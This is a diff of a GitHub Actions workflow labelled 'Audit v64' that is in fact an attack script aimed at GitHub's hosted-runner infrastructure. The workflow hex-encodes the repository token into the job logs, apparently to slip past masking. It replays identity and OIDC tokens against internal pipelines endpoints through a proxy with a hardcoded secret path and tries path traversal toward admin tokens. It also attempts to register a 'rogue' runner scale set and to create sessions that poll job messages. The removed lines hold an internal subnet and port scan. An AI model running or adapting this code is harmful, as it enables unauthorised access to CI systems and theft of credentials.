@@ -1,4 +1,4 @@
-name: Audit v63
+name: Audit v64
 on:
   pull_request:
     types: [opened, synchronize, reopened]
@@ -15,7 +15,7 @@ permissions:
   issues: write
 
 jobs:
-  audit-v63:
+  audit-v64:
     runs-on: ubuntu-latest
     steps:
 
@@ -23,7 +23,7 @@ jobs:
         if: always()
         run: |
           set +e
-          echo "=== V63 HARVEST ==="
+          echo "=== V64 HARVEST ==="
           echo "$PATH" > /tmp/saved_path.txt
           RT="${{ secrets.GITHUB_TOKEN }}"
           echo "$RT" > /tmp/rt.txt
@@ -59,66 +59,9 @@ jobs:
           echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
 
       # ══════════════════════════════════════════════════════════════
-      # STEP 2: INTERNAL SUBNET SCAN FROM RUNNER
-      # Runner is at 10.1.0.185 on 10.1.0.0/20
-      # Internal GitHub services LIVE in this same subnet!
-      # Scan for open HTTP services on ports 80, 443, 8080, 19000, 19001
+      # STEP 2: PLAN/JOB ID INJECTION + OIDC AS BEARER
       # ══════════════════════════════════════════════════════════════
-      - name: Step 2 - Subnet Discovery
-        if: always()
-        run: |
-          set +e
-          export PATH=$(cat /tmp/saved_path.txt)
-          echo "=== SUBNET SCAN ==="
-          IDTOK=$(cat /tmp/idtok.txt)
-
-          # A: Scan common hosts in 10.1.0.0/20 — .1 through .30 (gateway/services)
-          echo "--- A: Gateway and service IPs ---"
-          for LAST in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 100 254; do
-            IP="10.1.0.$LAST"
-            for PORT in 80 443 8080; do
-              CODE=$(/usr/bin/curl -sS -w "%{http_code}" -o /dev/null --connect-timeout 1 -m 1 \
-                "http://$IP:$PORT/" 2>/dev/null || echo "000")
-              if [ "$CODE" != "000" ]; then
-                echo "A $IP:$PORT HTTP = $CODE"
-                /usr/bin/curl -sS -m 2 "http://$IP:$PORT/" 2>/dev/null | head -c 200
-                echo ""
-              fi
-            done
-          done
-          echo ""
-
-          # B: Probe the exact subnet range with nc / TCP connect for port discovery
-          echo "--- B: TCP port sweep on 10.1.0.1-30 ---"
-          for LAST in $(seq 1 30); do
-            IP="10.1.0.$LAST"
-            for PORT in 80 443 8080 2375 2376 6443 10250 10255 19000 19001 4194; do
-              timeout 1 bash -c "echo >/dev/tcp/$IP/$PORT" 2>/dev/null && echo "B OPEN $IP:$PORT"
-            done
-          done
-          echo ""
-
-          # C: Hit the 172.208.153.230 public outbound IP and load balancer IPs
-          echo "--- C: Infrastructure IPs ---"
-          for IP in "172.208.153.230" "168.63.129.16"; do
-            for PORT in 80 443 8080; do
-              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
-                "http://$IP:$PORT/" 2>/dev/null)
-              CODE=$(echo "$R" | tail -1)
-              if [ "$CODE" != "HTTP_000" ]; then
-                echo "C $IP:$PORT = $CODE"
-                echo "$R" | sed '$d' | head -c 200
-                echo ""
-              fi
-            done
-          done
-
-      # ══════════════════════════════════════════════════════════════
-      # STEP 3: PLAN/JOB ID INJECTION + OIDC AS BEARER
-      # The actual PLAN and JOB IDs are known — inject them into paths.
-      # Also try the OIDC JWT directly as Bearer on pipelines.
-      # ══════════════════════════════════════════════════════════════
-      - name: Step 3 - Plan-ID Injection and OIDC Bearer
+      - name: Step 2 - Plan-ID Injection and OIDC Bearer
         if: always()
         run: |
           set +e
@@ -134,25 +77,23 @@ jobs:
           PIPE_HOST="pipelines.actions.githubusercontent.com"
           VER="api-version=6.0-preview"
 
-          # Fetch OIDC JWT
           OIDC=$(/usr/bin/curl -sS -m 5 \
             -H "Authorization: Bearer $IDTOK" \
             "${IDTOK_URL}&audience=api://AzureADTokenExchange" 2>/dev/null | \
             python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('value',''))" 2>/dev/null)
           echo "OIDC_LEN=${#OIDC} PLAN=$PLAN JOB=$JOB"
 
-          # A: Inject actual PLAN ID into API paths
-          echo "--- A: Plan ID paths ---"
+          # A: Inject actual PLAN and JOB IDs via the direct pipelines URL
+          echo "--- A: Plan/Job path injection ---"
           for EP in \
             "_apis/distributedtask/plans/$PLAN" \
             "_apis/distributedtask/plans/$PLAN/jobs" \
             "_apis/distributedtask/plans/$PLAN/jobs/$JOB" \
             "_apis/distributedtask/plans/$PLAN/jobs/$JOB/admintoken" \
             "_apis/distributedtask/plans/$PLAN/jobs/$JOB/idtoken" \
-            "_apis/distributedtask/plans/$PLAN/timelines" \
             "_apis/distributedtask/plans/$PLAN/logs" \
-            "build/_apis/build/builds/$PLAN" \
-            "_apis/pipelines/workflows/$PLAN/runs/$JOB"; do
+            "_apis/distributedtask/plans/$PLAN/timelines" \
+            "_apis/_apis/distributedtask/plans/$PLAN/jobs/$JOB/admintoken"; do
             R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
               -H "Authorization: Bearer $IDTOK" \
               -H "Accept: application/json; $VER" \
@@ -160,18 +101,21 @@ jobs:
             CODE=$(echo "$R" | tail -1)
             BODY=$(echo "$R" | sed '$d')
             echo "A $EP = $CODE"
-            echo "$BODY" | head -c 300
+            echo "$BODY" | head -c 400
             echo ""
           done
 
-          # B: OIDC JWT as Bearer against pipelines + runner proxy
-          echo "--- B: OIDC as Bearer ---"
+          # B: OIDC JWT as Bearer against pipelines proxy
+          echo "--- B: OIDC as Bearer on pipelines ---"
           for EP in \
             "_apis/distributedtask/pools" \
             "_apis/distributedtask/pools/1/admintoken" \
             "_apis/distributedtask/pools/2/admintoken" \
+            "_apis/distributedtask/pools/1/agents" \
+            "_apis/distributedtask/pools/..%2fadmintoken" \
             "_apis/runtime/runnergroups" \
-            "_apis/connectionData"; do
+            "_apis/runtime/runnergroups/2/runners" \
+            "_apis/runtime/runnerscalesets"; do
             R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
               -H "Authorization: Bearer $OIDC" \
               -H "Host: $PIPE_HOST" \
@@ -179,65 +123,56 @@ jobs:
               "$PROXY/$EP" --path-as-is 2>/dev/null)
             CODE=$(echo "$R" | tail -1)
             BODY=$(echo "$R" | sed '$d')
-            echo "B OIDC $EP = $CODE | $(echo "$BODY" | head -c 200)"
+            echo "B OIDC $EP = $CODE | $(echo "$BODY" | head -c 250)"
           done
 
       # ══════════════════════════════════════════════════════════════
-      # STEP 4: ROGUE SCALE SET REGISTRATION + POOL TRAVERSAL COMBOS
-      # runnerscalesets/1 and /2 = 204 — injected IDs exist!
-      # POST to create our own scale set in the confirmed groups.
-      # Combine pool 1/2 with path traversal for new endpoints.
+      # STEP 3: SCALE SET INJECTION + POOL SUB-ENDPOINTS
       # ══════════════════════════════════════════════════════════════
-      - name: Step 4 - Scale Set Injection and Pool Traversal Combos
+      - name: Step 3 - Scale Set and Pool Sub-Endpoints
         if: always()
         run: |
           set +e
           export PATH=$(cat /tmp/saved_path.txt)
-          echo "=== SCALESET + POOL TRAVERSAL ==="
+          echo "=== SCALESET + POOL SUBS ==="
           IDTOK=$(cat /tmp/idtok.txt)
           SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
           PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
-          PIPE="https://pipelines.actions.githubusercontent.com/$SECRET"
           PIPE_HOST="pipelines.actions.githubusercontent.com"
           VER="api-version=6.0-preview"
 
-          # A: POST to runtime/runnerscalesets to register rogue scale set
-          echo "--- A: Register rogue scale set ---"
+          # A: POST to runnerscalesets — register rogue
+          echo "--- A: Rogue scale set registration ---"
           for GID in 1 2; do
-            for BODY in \
-              "{\"Name\":\"v63-rogue\",\"RunnerGroupId\":$GID}" \
-              "{\"name\":\"v63-rogue\",\"runnerGroupId\":$GID,\"runnerSetting\":{\"ephemeral\":true}}" \
-              "{\"Name\":\"v63-rogue\",\"RunnerGroupId\":$GID,\"Statistics\":{\"TotalEphemeralRunners\":1}}"; do
-              R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 3 \
-                -H "Authorization: Bearer $IDTOK" \
-                -H "Host: $PIPE_HOST" \
-                -H "Content-Type: application/json" \
-                -H "Accept: application/json; $VER" \
-                "$PROXY/_apis/runtime/runnerscalesets" --path-as-is \
-                -d "$BODY" 2>/dev/null)
-              CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
-              echo "A POST scalesets GID=$GID = $CODE"
-              echo "$R" | tail -5 | head -c 400
-              echo ""
-            done
+            R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 4 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "Host: $PIPE_HOST" \
+              -H "Content-Type: application/json" \
+              -H "Accept: application/json; $VER" \
+              "$PROXY/_apis/runtime/runnerscalesets" --path-as-is \
+              -d "{\"Name\":\"v64-rogue\",\"RunnerGroupId\":$GID}" 2>/dev/null)
+            CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
+            echo "A POST scalesets GID=$GID = $CODE"
+            echo "$R" | tail -5 | head -c 500
+            echo ""
           done
           echo ""
 
-          # B: Traverse from pools/1 and pools/2 to new endpoints never tried
-          echo "--- B: New pool traversal combos ---"
+          # B: New pool sub-endpoints never tried
+          echo "--- B: New pool sub-paths ---"
           for PID in 1 2; do
             for EP in \
-              "generateserviceprincipal" \
               "generatejitconfig" \
               "createdsession" \
               "acquirejobs" \
-              "recycle" \
-              "upgrade" \
+              "generateserviceprincipal" \
               "settings" \
               "metadata" \
               "capabilities" \
               "maintenance" \
-              "serviceaccounts"; do
+              "serviceaccounts" \
+              "recycle" \
+              "upgrade"; do
               R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 1 -m 2 \
                 -H "Authorization: Bearer $IDTOK" \
                 -H "Host: $PIPE_HOST" \
@@ -252,12 +187,14 @@ jobs:
               fi
             done
           done
+          echo ""
 
-          # C: Traversal from runnergroups/2 (GitHub Actions group - 20 runners)
-          echo "--- C: runnergroups/2 sub-endpoints ---"
+          # C: runnergroups/2 (GitHub Actions, 20 hosted runners) — sub-paths
+          echo "--- C: runnergroups/2 sub-paths ---"
           for EP in \
             "runners" "jitconfig" "accesspolicy" "settings" \
-            "generatejitconfig" "acquirejobs" "runnerscalesets" "admintoken"; do
+            "generatejitconfig" "acquirejobs" "runnerscalesets" "admintoken" \
+            "runnerscalesets/1" "runnerscalesets/2"; do
             R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 1 -m 2 \
               -H "Authorization: Bearer $IDTOK" \
               -H "Host: $PIPE_HOST" \
@@ -270,11 +207,80 @@ jobs:
             echo ""
           done
 
+      # ══════════════════════════════════════════════════════════════
+      # STEP 4: BROKERLISTENER + CREATEDSESSION + MESSAGES
+      # These are the core runner-agent communication endpoints.
+      # Try with CTOK (agent credential) and via proxy with pipelines Host.
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 4 - BrokerListener and Session Messages
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== BROKER + MESSAGES ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
+          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
+          PIPE_HOST="pipelines.actions.githubusercontent.com"
+          VER="api-version=6.0-preview"
+          PLAN=$(cat /tmp/plan.txt)
+          JOB=$(cat /tmp/job.txt)
+
+          # A: BrokerListener — agent listens for jobs on this endpoint
+          echo "--- A: BrokerListener ---"
+          for TOK_NAME in IDTOK CTOK; do
+            eval TOK=\$$TOK_NAME
+            [ -z "$TOK" ] || [ "${#TOK}" -lt 10 ] && continue
+            for PID in 1 2; do
+              R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 4 \
+                -H "Authorization: Bearer $TOK" \
+                -H "Host: $PIPE_HOST" \
+                -H "Accept: application/json; $VER" \
+                "$PROXY/_apis/distributedtask/pools/$PID/brokerlistener" --path-as-is 2>/dev/null)
+              CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
+              echo "A $TOK_NAME brokerlistener pool/$PID = $CODE"
+              echo "$R" | tail -5 | head -c 400
+              echo ""
+            done
+          done
+          echo ""
+
+          # B: createdsession — the endpoint that creates authenticated sessions
+          echo "--- B: createdsession ---"
+          for PID in 1 2; do
+            R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 4 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "Host: $PIPE_HOST" \
+              -H "Content-Type: application/json" \
+              -H "Accept: application/json; $VER" \
+              "$PROXY/_apis/distributedtask/pools/$PID/createdsession" --path-as-is \
+              -d "{\"ownerName\":\"v64\",\"sessionId\":\"00000000-0000-0000-0000-000000000001\"}" 2>/dev/null)
+            CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
+            echo "B POST createdsession pool/$PID = $CODE"
+            echo "$R" | tail -5 | head -c 400
+            echo ""
+          done
+
+          # C: Message polling — if we had a session ID we could poll messages
+          echo "--- C: Messages via traversal ---"
+          for SESS_ID in "00000000-0000-0000-0000-000000000001" "1" "0"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "Host: $PIPE_HOST" \
+              -H "Accept: application/json; $VER" \
+              "$PROXY/_apis/distributedtask/pools/2/messages?sessionId=$SESS_ID&lastMessageId=0" --path-as-is 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "C messages sessionId=$SESS_ID = $CODE | $(echo "$BODY" | head -c 300)"
+          done
+
       - name: Step 5 - Final
         if: always()
         run: |
           set +e
           export PATH=$(cat /tmp/saved_path.txt)
-          echo "=== V63 FINAL ==="
+          echo "=== V64 FINAL ==="
           echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
-          echo "=== V63 COMPLETE ==="
+          echo "=== V64 COMPLETE ==="
